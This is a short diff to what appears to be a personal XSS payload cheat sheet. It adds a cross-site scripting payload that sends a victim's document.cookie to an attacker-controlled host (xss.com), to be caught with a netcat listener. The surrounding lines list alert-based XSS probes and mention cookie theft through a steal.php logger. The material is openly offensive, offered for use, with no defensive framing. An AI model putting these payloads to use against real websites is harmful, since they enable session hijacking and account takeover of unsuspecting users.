@@ -3,6 +3,11 @@ always try to inpuit " ' >
 <svg/onload=alert('2')>
 <IMG SRC= onmouseover="alert('3')">
 <IMG onmouseover="alert('4')">
+ =================================================
+|      XSS to post cookie with nc -lvnp 80        |
+ =================================================
+<script>document.write('<img src="http://xss.com/pleasesubscribe.gif?cookie=' + document.cookie+ '" />')</script>
+
 
  --------------------------------------------------------------
 | below xss post cookie to log.txt with the help of steal.php |
